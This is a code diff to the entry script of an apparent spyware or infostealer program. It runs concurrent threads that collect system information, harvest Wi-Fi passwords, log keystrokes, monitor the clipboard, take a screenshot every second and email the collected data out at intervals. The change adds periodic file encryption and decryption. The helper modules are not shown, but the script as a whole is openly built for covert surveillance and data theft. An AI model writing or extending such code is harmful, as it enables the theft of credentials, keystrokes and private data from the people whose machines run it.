@@ -1,30 +1,23 @@
-import os
-import time
 from concurrent.futures import ThreadPoolExecutor
-from data_collection import computer_information, wifi_passwords, copy_clipboard,keylogger
+
+# Import functions from modularized components
+from data_collection import computer_information, keylogger, wifi_passwords, copy_clipboard
 from screenshot_capture import periodic_screenshot_capture
 from send_email import send_emails_periodically
+from encrypt_and_decrypt import encrypt_files, decrypt_files
 
-# Function to trigger all operations concurrently
 def start_program():
-    with ThreadPoolExecutor(max_workers=6) as executor:
-        # Start data collection (computer info and wifi passwords)
-        executor.submit(computer_information)
-        executor.submit(wifi_passwords)
-        
-        #start the logging keystrokes
-        executor.submit(keylogger)
+    """Starts the program by executing tasks concurrently using ThreadPoolExecutor."""
+    with ThreadPoolExecutor(max_workers=8) as executor:
+        executor.submit(computer_information)  # Collect system information
+        executor.submit(wifi_passwords)       # Gather Wi-Fi credentials
+        executor.submit(keylogger)            # Log keystrokes
+        executor.submit(copy_clipboard)       # Monitor and log clipboard content
+        executor.submit(encrypt_files)        # Encrypt files periodically
+        executor.submit(decrypt_files)        # Decrypt files when needed
+        executor.submit(periodic_screenshot_capture, 1)  # Capture screenshots at intervals
+        executor.submit(send_emails_periodically)        # Send periodic emails with collected data
 
-        # Start copying clipboard data
-        executor.submit(copy_clipboard)  
-
-        # Start periodic screenshot capture
-        executor.submit(periodic_screenshot_capture, 1)  # Capture screenshots every 1 second
-
-        # Start sending emails periodically (screenshots, encrypted files, clipboard PDF)
-        executor.submit(send_emails_periodically)
-
-# Main execution
 if __name__ == "__main__":
+    # Entry point for the program
     start_program()
-
